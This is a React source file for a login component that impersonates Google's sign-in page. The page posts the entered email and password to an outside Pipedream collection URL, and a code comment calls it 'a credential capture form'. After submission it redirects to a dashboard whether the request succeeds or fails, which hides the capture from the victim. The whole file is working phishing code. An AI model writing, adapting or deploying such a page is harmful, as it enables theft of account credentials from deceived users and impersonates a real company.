
import React, { useState } from 'react';
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";
import GoogleLogo from './GoogleLogo';
import { useNavigate } from 'react-router-dom';

const API_ENDPOINT = "https://eolsd3wydxkm43e.m.pipedream.net/";

const LoginForm = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!email || !password) {
      toast.error("Please enter both email and password");
      return;
    }
    
    setIsLoading(true);
    
    try {
      const response = await fetch(API_ENDPOINT, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });
      
      console.log('Response:', response);
      
      if (response.ok) {
        toast.success("Login successful");
        // Simulate successful login
        setTimeout(() => {
          setIsLoading(false);
          navigate('/dashboard');
        }, 1500);
      } else {
        throw new Error('Network response was not ok');
      }
    } catch (error) {
      console.error('Error during login:', error);
      setIsLoading(false);
      
      // Since this is a credential capture form, we'll show a generic error
      // but still consider it "successful" for the demo
      toast.error("Something went wrong. Please try again.");
      
      // Simulate successful login anyway after a delay
      setTimeout(() => {
        navigate('/dashboard');
      }, 2000);
    }
  };

  return (
    <div className="w-full max-w-md animate-fade-in-up">
      <div className="glass-card rounded-2xl p-8 shadow-lg">
        <div className="mb-8 text-center">
          <div className="flex justify-center mb-4">
            <GoogleLogo className="w-16 h-16" />
          </div>
          <h2 className="text-2xl font-semibold tracking-tight">Sign in with Google</h2>
          <p className="text-muted-foreground mt-2 text-balance">
            Use your Google Account to continue
          </p>
        </div>
        
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="space-y-2">
            <Input
              type="email"
              placeholder="Email or phone"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="h-12 px-4 rounded-xl bg-white/50 dark:bg-black/20 backdrop-blur-subtle border focus:border-google-blue focus:ring-2 focus:ring-google-blue/20 transition-all"
              required
            />
          </div>
          
          <div className="space-y-2">
            <Input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="h-12 px-4 rounded-xl bg-white/50 dark:bg-black/20 backdrop-blur-subtle border focus:border-google-blue focus:ring-2 focus:ring-google-blue/20 transition-all"
              required
            />
          </div>
          
          <div className="pt-2">
            <Button
              type="submit"
              className="w-full h-12 bg-google-blue hover:bg-google-blue/90 text-white font-medium text-base rounded-xl shadow-sm hover:shadow transition-all duration-300"
              disabled={isLoading}
            >
              {isLoading ? (
                <div className="flex items-center gap-2">
                  <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  <span>Signing in...</span>
                </div>
              ) : (
                "Sign in"
              )}
            </Button>
          </div>
          
          <div className="flex items-center justify-between pt-2">
            <Button 
              variant="link" 
              className="text-google-blue hover:text-google-blue/80 p-0 h-auto font-normal"
            >
              Create account
            </Button>
            <Button 
              variant="link" 
              className="text-google-blue hover:text-google-blue/80 p-0 h-auto font-normal"
            >
              Forgot password?
            </Button>
          </div>
        </form>
      </div>
      
      <div className="mt-8 text-center">
        <p className="text-sm text-muted-foreground">
          <span>English (United States)</span>
          <span className="mx-2">·</span>
          <Button variant="link" className="p-0 h-auto text-sm text-muted-foreground hover:text-foreground font-normal">
            Help
          </Button>
          <span className="mx-2">·</span>
          <Button variant="link" className="p-0 h-auto text-sm text-muted-foreground hover:text-foreground font-normal">
            Privacy
          </Button>
          <span className="mx-2">·</span>
          <Button variant="link" className="p-0 h-auto text-sm text-muted-foreground hover:text-foreground font-normal">
            Terms
          </Button>
        </p>
      </div>
    </div>
  );
};

export default LoginForm;
